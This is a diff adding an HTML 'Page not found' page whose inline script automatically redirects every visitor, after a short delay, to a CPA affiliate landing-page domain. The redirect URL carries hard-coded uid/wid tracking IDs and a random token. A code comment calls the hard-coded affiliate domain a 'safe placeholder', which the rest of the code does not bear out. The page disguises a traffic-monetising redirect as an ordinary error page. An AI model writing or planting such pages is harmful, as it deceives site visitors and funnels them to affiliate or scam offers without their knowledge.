@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Not Found — Redirecting...</title>
+  <style>
+    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    .box{max-width:720px;padding:20px;text-align:center}
+    small{color:#666}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Page not found</h2>
+    <p>Redirecting — if your browser doesn't redirect automatically, <a id="link" href="#">click here</a>.</p>
+    <small id="info"></small>
+  </div>
+
+  <script>
+    // === CONFIGURE THIS: change only 'TARGET_BASE' to a domain you control/trust ===
+    const TARGET_BASE = 'https://cpalandingpages.site'; // safe placeholder; replace with your own domain
+    const UID = '475231'; // optional: include if you want to embed params
+    const WID = '717029';
+
+    // Generate a random token / timestamp to make each URL unique
+    function randomToken(len = 12) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let s = '';
+      for (let i = 0; i < len; i++) s += chars.charAt(Math.floor(Math.random() * chars.length));
+      return s;
+    }
+
+    // Build the redirect URL. Customize query params as needed.
+    function makeRedirectUrl() {
+      const token = randomToken(10);
+      const ts = Date.now();
+      const params = new URLSearchParams({
+        uid: UID,
+        wid: WID,
+        t: ts,
+        r: token
+      });
+      return TARGET_BASE + '?' + params.toString();
+    }
+
+    (function(){
+      const url = makeRedirectUrl();
+      const info = document.getElementById('info');
+      const link = document.getElementById('link');
+
+      link.href = url;
+      info.textContent = 'Redirect target: ' + url;
+
+      // Delay slightly so user sees what's happening, then redirect
+      setTimeout(()=> {
+        // Use replace() to avoid adding the 404 page to history
+        window.location.replace(url);
+      }, 600);
+    })();
+  </script>
+</body>
+</html>
